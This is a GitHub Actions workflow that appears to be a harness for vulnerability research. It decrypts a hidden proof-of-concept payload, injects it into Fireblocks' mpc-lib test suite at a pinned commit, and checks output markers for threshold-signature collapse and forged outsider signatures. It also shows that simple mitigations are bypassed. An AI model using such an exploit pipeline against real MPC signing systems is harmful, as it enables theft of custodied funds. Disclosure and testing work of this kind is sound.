name: Fireblocks CMP finalized-source deep validation v2

on:
  push:
    branches:
      - fireblocks-cmp-finalized-deep-v2-20260924
    paths:
      - .github/workflows/fireblocks-cmp-finalized-deep-v2.yml

permissions:
  contents: write

jobs:
  validate:
    runs-on: ubuntu-22.04
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fireblocks-cmp-finalized-deep-v2-20260924
          fetch-depth: 0

      - name: Publish one-time payload key
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p runner_exchange/fireblocks_cmp_finalized_deep_v2
          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out /tmp/payload_private.pem >/dev/null 2>&1
          openssl pkey -in /tmp/payload_private.pem -pubout -out runner_exchange/fireblocks_cmp_finalized_deep_v2/payload_public.pem >/dev/null 2>&1
          git config user.name "fireblocks-finalized-validator"
          git config user.email "fireblocks-finalized-validator@users.noreply.github.com"
          git add runner_exchange/fireblocks_cmp_finalized_deep_v2/payload_public.pem
          git commit -m "Publish finalized-source v2 one-time key [skip ci]" >/dev/null
          git push origin HEAD:fireblocks-cmp-finalized-deep-v2-20260924 >/dev/null

      - name: Wait for encrypted payload
        shell: bash
        run: |
          set -euo pipefail
          found=0
          for i in $(seq 1 300); do
            git fetch origin fireblocks-cmp-finalized-deep-v2-20260924 --quiet
            ok=1
            for f in payload.b64 payload_key.b64; do
              git show "origin/fireblocks-cmp-finalized-deep-v2-20260924:runner_exchange/fireblocks_cmp_finalized_deep_v2/$f" > "/tmp/$f" 2>/dev/null || ok=0
            done
            if [ "$ok" = "1" ]; then found=1; break; fi
            sleep 2
          done
          test "$found" = "1"

      - name: Decrypt payload
        shell: bash
        run: |
          set -euo pipefail
          base64 -d /tmp/payload_key.b64 > /tmp/payload_key.enc
          base64 -d /tmp/payload.b64 > /tmp/payload.enc
          openssl pkeyutl -decrypt -inkey /tmp/payload_private.pem             -in /tmp/payload_key.enc -out /tmp/payload_keyiv.bin             -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
          KEY=$(dd if=/tmp/payload_keyiv.bin bs=1 count=32 2>/dev/null | od -An -tx1 | tr -d ' \n')
          IV=$(dd if=/tmp/payload_keyiv.bin bs=1 skip=32 count=16 2>/dev/null | od -An -tx1 | tr -d ' \n')
          openssl enc -d -aes-256-cbc -K "$KEY" -iv "$IV" -in /tmp/payload.enc -out /tmp/payload.zip
          rm -rf /tmp/poc && mkdir /tmp/poc
          unzip -q /tmp/payload.zip -d /tmp/poc
          test -f /tmp/poc/test_fragment.cpp

      - name: Install dependencies
        run: |
          set -euo pipefail
          sudo apt-get update
          sudo apt-get install -y build-essential cmake libssl-dev uuid-dev libsecp256k1-dev

      - name: Fetch Fireblocks exact SHA and inject regression
        shell: bash
        run: |
          set -euo pipefail
          rm -rf /tmp/mpc-lib
          git init -q /tmp/mpc-lib
          git -C /tmp/mpc-lib remote add origin https://github.com/fireblocks/mpc-lib.git
          git -C /tmp/mpc-lib fetch -q --depth 1 origin 00ae08b7f1bdbb887aedece384aca2f942aae432
          git -C /tmp/mpc-lib checkout -q FETCH_HEAD
          test "$(git -C /tmp/mpc-lib rev-parse HEAD)" = "00ae08b7f1bdbb887aedece384aca2f942aae432"
          cat /tmp/poc/test_fragment.cpp >> /tmp/mpc-lib/test/cosigner/ecdsa_online_test.cpp
          git -C /tmp/mpc-lib diff --check
          sha256sum /tmp/poc/test_fragment.cpp

      - name: Build vulnerable upstream cosigner_test
        run: |
          set -euo pipefail
          cmake -S /tmp/mpc-lib -B /tmp/mpc-build -DCMAKE_BUILD_TYPE=RelWithDebInfo
          cmake --build /tmp/mpc-build --target cosigner_test -j2

      - name: Run finalized-source exploit
        shell: bash
        run: |
          set -euo pipefail
          /tmp/mpc-build/test/cosigner/cosigner_test             "cmp finalized source authenticated-binding failure" --success 2>&1 | tee /tmp/finalized.log
          grep -q '^FINALIZED_SOURCE_THRESHOLD_COLLAPSE_SECP256K1=1$' /tmp/finalized.log
          grep -q '^FINALIZED_SOURCE_THRESHOLD_COLLAPSE_SECP256R1=1$' /tmp/finalized.log
          test "$(grep -c '^OUTSIDER_CHILD_SIGNATURE_0_VERIFIES=1$' /tmp/finalized.log)" = "2"
          test "$(grep -c '^OUTSIDER_CHILD_SIGNATURE_1_VERIFIES=1$' /tmp/finalized.log)" = "2"
          test "$(grep -c '^DESTINATION_BACKUP_AND_FINALIZATION_COMPLETE=1$' /tmp/finalized.log)" = "2"
          test "$(grep -c '^HONEST_DESTINATION_TWO_BLOCK_CMP_SIGNING=1$' /tmp/finalized.log)" = "2"
          echo "FINALIZED_SOURCE_EXACT_UPSTREAM=PASS"

      - name: Run coalition on current code
        shell: bash
        run: |
          set -euo pipefail
          /tmp/mpc-build/test/cosigner/cosigner_test             "cmp finalized two-of-three coalition bypasses naive guards" --success 2>&1 | tee /tmp/coalition-current.log
          grep -q '^NAIVE_MIN2_AND_NON_INFINITY_FIX_BYPASS=1$' /tmp/coalition-current.log
          grep -q '^HONEST_SOURCE_3_OMITTED=1$' /tmp/coalition-current.log

      - name: Apply naive guards
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          from pathlib import Path
          p=Path('/tmp/mpc-lib/src/common/cosigner/cmp_setup_service.cpp')
          s=p.read_text()
          s=s.replace('if (data.size() == 0)', 'if (data.size() < 2)', 1)
          anchor='''    auto algebra = get_algebra(algorithm);

              for (auto i = players_ids.begin(); i != players_ids.end(); ++i)
          '''
          repl='''    auto algebra = get_algebra(algorithm);

              if (algebra->validate_non_infinity_point(algebra, &metadata.public_key) != ELLIPTIC_CURVE_ALGEBRA_SUCCESS)
                  throw_cosigner_exception(cosigner_exception::INVALID_PARAMETERS);

              for (auto i = players_ids.begin(); i != players_ids.end(); ++i)
          '''
          if anchor not in s:
              raise SystemExit('non-infinity anchor missing')
          s=s.replace(anchor,repl,1)
          p.write_text(s)
          PY
          git -C /tmp/mpc-lib diff --check

      - name: Rebuild naive mitigation
        run: |
          set -euo pipefail
          cmake -S /tmp/mpc-lib -B /tmp/mpc-naive-build -DCMAKE_BUILD_TYPE=RelWithDebInfo
          cmake --build /tmp/mpc-naive-build --target cosigner_test -j2

      - name: Prove naive mitigation bypass
        shell: bash
        run: |
          set -euo pipefail
          /tmp/mpc-naive-build/test/cosigner/cosigner_test             "cmp finalized two-of-three coalition bypasses naive guards" --success 2>&1 | tee /tmp/coalition-naive.log
          grep -q '^SOURCE_MAP_SIZE_TWO=1$' /tmp/coalition-naive.log
          grep -q '^FORGED_EXPECTED_PUBLIC_KEY_NON_INFINITY=1$' /tmp/coalition-naive.log
          grep -q '^NAIVE_MIN2_AND_NON_INFINITY_FIX_BYPASS=1$' /tmp/coalition-naive.log
          echo "NAIVE_TWO_GUARD_MITIGATION_BYPASSED=PASS"
